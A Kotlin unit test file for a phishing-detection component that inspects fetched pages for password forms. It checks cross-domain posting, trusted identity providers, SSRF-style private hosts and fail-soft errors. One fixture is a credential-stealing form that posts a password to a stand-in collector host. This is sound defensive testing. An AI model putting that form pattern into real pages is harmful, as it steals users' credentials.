package com.linkguard.app.data.provider

import com.linkguard.app.domain.model.SignalStrength
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class HttpCredentialFormInspectorTest {

    private val loginHtml =
        """<html><body><form action="/submit" method="post">
           <input type="text" name="user"><input type="password" name="pass">
           </form></body></html>"""

    @Test
    fun `password form on untrusted site is a medium signal`() = runBlocking {
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, loginHtml))
            .inspect("http://login-evil.test/account")
        assertEquals(1, signals.size)
        assertEquals("CREDENTIAL_FORM_UNTRUSTED", signals[0].ruleId)
        assertEquals(SignalStrength.MEDIUM, signals[0].strength)
    }

    @Test
    fun `password form posting to another domain is a strong exfil signal`() = runBlocking {
        val html = """<form action="https://collector.bad/steal">
            <input type='password'></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("http://login-evil.test/account")
        assertEquals(1, signals.size)
        assertEquals("CREDENTIAL_FORM_EXFIL", signals[0].ruleId)
        assertEquals(SignalStrength.STRONG, signals[0].strength)
    }

    @Test
    fun `password form posting to a trusted identity provider is not exfil`() = runBlocking {
        // Legitimate OAuth: a password field plus a form posting to a trusted IdP must not
        // be treated as cross-domain credential theft (still flagged as untrusted login).
        val html = """<form action="https://accounts.google.com/signin">
            <input type="password"></form>"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("http://some-portal.test/login")
        assertEquals(1, signals.size)
        assertEquals("CREDENTIAL_FORM_UNTRUSTED", signals[0].ruleId)
    }

    @Test
    fun `page without a password field yields no signal`() = runBlocking {
        val html = "<html><body><form><input type='text' name='q'></form></body></html>"
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
            .inspect("http://news.test/article")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `non-html content type is not parsed`() = runBlocking {
        // A JSON body that happens to contain the literal text must not be scanned as HTML.
        val body = """{"note":"<input type=password>"}"""
        val signals = HttpCredentialFormInspector(clientReturningHtml(200, body, "application/json"))
            .inspect("http://api.test/data")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `trusted domain is skipped without a request`() = runBlocking {
        // clientFailing would throw if a request were made; the trusted-host guard must skip first.
        val signals = HttpCredentialFormInspector(clientFailing())
            .inspect("https://google.com/login")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `private host is skipped without a request (anti-SSRF)`() = runBlocking {
        val signals = HttpCredentialFormInspector(clientFailing())
            .inspect("http://192.168.1.1/login")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `non-2xx response yields no signal`() = runBlocking {
        val signals = HttpCredentialFormInspector(clientReturningHtml(404, loginHtml))
            .inspect("http://login-evil.test/account")
        assertTrue(signals.isEmpty())
    }

    @Test
    fun `network failure is fail-soft, never throws`() = runBlocking {
        // An amplifier must never break the scan: a transport error becomes an empty result.
        val signals = HttpCredentialFormInspector(clientFailing())
            .inspect("http://login-evil.test/account")
        assertTrue(signals.isEmpty())
    }
}
